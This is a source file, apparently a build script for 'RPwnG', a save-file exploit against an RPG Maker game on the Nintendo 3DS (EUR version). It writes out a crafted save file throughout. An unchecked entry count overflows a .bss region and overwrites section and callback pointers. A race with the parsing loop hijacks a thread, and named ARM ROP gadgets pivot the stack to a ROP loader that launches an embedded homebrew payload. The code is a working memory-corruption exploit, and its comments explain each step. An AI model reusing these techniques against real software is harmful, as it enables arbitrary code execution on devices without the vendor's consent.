import os
include("../ropdb/DB.py")
include("../rop/constants.py")

set_mem_offset(FILE_PTR)

GAME_SECTIONS_ENTRY = 0x102
CALLBACK_VAR_ENTRY = 0x2236

put_label('start')

##HEADER##
add_halfword(0x0101)
add_ascii("rtk0805a")

org(FILE_PTR+0x14)
add_word(0x4) # type ? replacedby 4 when downloaded anyway
add_word(SECTION2_OFFSET) # I don't know if this is really used, the offset seems to be hardcoded...
add_utf16("RPwnG - EUR") # title

org(FILE_PTR+0x80)
add_utf16("by MrNbaYoh/Nba_Yoh") # author

org(FILE_PTR+0xB4)
add_word(end-start) # size


##SECTION1##
org(SECTION1_PTR)

nb_entries = 0x2280 # number of entries in section2, unchecked => overflow in .bss that overwrites section1/2 ptrs and other ptrs

add_word(0x00000001) # first entry in section1 (index=0), need to be != 0 to indicate it has to be parsed
fill(0x48, 0)
add_word(0x0)
add_word(0x1) # needs to be != 0 so the associated section2 chunk is parsed

#set everything else in this section too null except title/decscription (needed for online sharing) to avoid issues

org(FILE_PTR+TITLE_OFFSET)
add_utf16("RPwnG - EUR")

org(FILE_PTR+DESC_OFFSET)
add_utf16("The homebrew launcher - All you bases are belong to us!")

##SECTION2##
org(SECTION2_PTR)

#each chunk of this section has a variable size, it is composed of multiple sub-chunks of variable sizes
#each chunk has a 0x404 bytes long header(?), the first two bytes indicate how many sub-chunks there are
#each sub-chunk has a 0x2C bytes long header(?) and the byte at offset 0x26 indicates some potential extra data after the header
#so if the byte at offset 0x26 is null, then the size of the sub-chunk is the size of its header = 0x2C

#the memcpy src buffer will contain this area at offset 0
begin_area(0x404)
add_halfword(nb_entries) #nb_entries read by the game
add_halfword(0x0) #align 4
add_word(0x0) #this might get overwritten when uploading the file, can store anything after that so why not the ROPs ?
incbin("../rop/build/rop_loader.bin")
incbin("../rop/build/rop.bin")
end_area()

org(SECTION2_PTR+0x404)

fill(0x2C*GAME_SECTIONS_ENTRY, 0) # add 0x102 null chunks (unused) of size 0x2C
#chunk 0x102 overwrites some pointers, don't change them to avoid issues
add_word(SECTION1_PTR) #this will be written over the section1 ptr in BSS, don't change it (current_game_sections)
add_word(SECTION2_PTR) #this will be written over the section2 ptr in BSS, don't change it
fill(0x24, 0)


org(SECTION2_PTR+0x404+CALLBACK_VAR_ENTRY*0x2C)
#chunk 0x2237 overwrite a pointer used in a callback, we take control of it to get an arbitrary jump
fill(0x1C, 0)
add_word(controlled_ptr) # JPN: callback value to overwrite is a bit (0x8 bytes) less far in mem than the one on EUR/USA (bss section is different on JPN, while USA and EUR ones are really similar)
add_word(0x0)
add_word(controlled_ptr) # EUR/USA: overwrite a variable used in a callback (sub_10FA00 in EUR 1.1.4), offset 0x26 overwritten affect size of the chunk
add_word(0x0)

# to overwrite the ptr we need to write a value != 0 at offset 0x26, so the size of the chunk is affected by that
fill((controlled_ptr & 0x00FF0000) >> 24, 0) # add null bytes in extra data according to what is written at chunk offset 0x26


#add some extra chunks with a large size (offset 0x26 set to 0xFF) so the loop that parses them is going to take more time to terminate
#this gives enough time for the callback to be called before the function that contains the loop returns
#so we take over the callback's thread and then memcpy over the stack of the main thread (the one where the loop is running) to get control of it (see rop_loader.py)
for i in range(nb_entries-(CALLBACK_VAR_ENTRY+1)):
    fill(0x2C, 0xFF)
    fill(0x38*0xFF, 0xFF)



##STUFF TO STACK PIVOT UNDER THE CALLBACK THREAD##

put_label("controlled_ptr")
add_word(0xFFFFFFFF) # *(u8*)(controlled_ptr+1) has to be != 0 to make it jump to *(u32*)(controlled_ptr+0x38)
add_word(0x0)
add_word(0x0)
#offset 0xC
add_word(0x2) #has to be even to avoid some useless stuff
add_word(0x0)
add_word(0x0)
#offset 0x18
add_word((controlled_ptr - 0x1C*(jmp_arg-1))%0x100000000) #to compute a ptr the game does that : v2 = *(u32*)(controlled_ptr+0x18) + 0x1C * *(u32*)(controlled_ptr+0x28), so set this value such as the ptr = controlled_ptr
add_word(0x0)
add_word(0x0) # need to be less than value at offset 0x28 +1 to avoid a (potentially annoying) jump, so just set it to 0
add_word(0x0)
#offset 0x28
add_word(jmp_arg-1) #arg passed to the fun see offset 0x38
add_word(0x0)
add_word(0x0)
add_word(0x0)
#offset 0x38
add_word(MOV_R4R0_LDR_R1R0_LDR_R1R1_8_BLX_R1) #jump to this, when jump r0= *(u32*)(controlled_ptr+0x28) + 1
                                              #so we control r0 and pc
                                              #move r0 to r4 and then jump to LDRD_R2R3R0_60_LDR_R0R0_LDR_R1R0_34_MOV_R0R4_BLX_R1 to load r2


##R0 POINTS HERE WHEN GETTING ARBITRARY JUMP##

put_label('jmp_arg')
add_word(jmp_arg-0x4)
add_word(LDRD_R2R3R0_60_LDR_R0R0_LDR_R1R0_34_MOV_R0R4_BLX_R1) # load the pivot gadget to r2 and then jump to LDRD_ROR1R4_8_BLX_R2 (r0 is unchanged here)
add_word(ROP_LOADER_PTR) #popped to r0, new stack pointer for the pivot => jump to rop loader
add_word(NOP) #popped to r1, jump to pop {pc} after the stack pointer is changed

org(jmp_arg+0x30)
add_word(LDRD_ROR1R4_8_BLX_R2) # load r0 and r1 and then jump to the pivot gadget

org(jmp_arg+0x60)
add_word(MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1) #popped to r2, pivot gadget
add_word(0xDEADC0DE) #popped to r3, unused


##PAYLOADS##

org(OTHERAPP_PTR-0x4) #too lazy to compute the exact position of the last 0xDEADC0DE, so we just store the payloads at a fixed offset that should be reached by all the previous stuff
add_word(os.path.getsize('../otherapp.bin'))
incbin("../otherapp.bin")
incbin("../code/code.bin")

put_label('end')
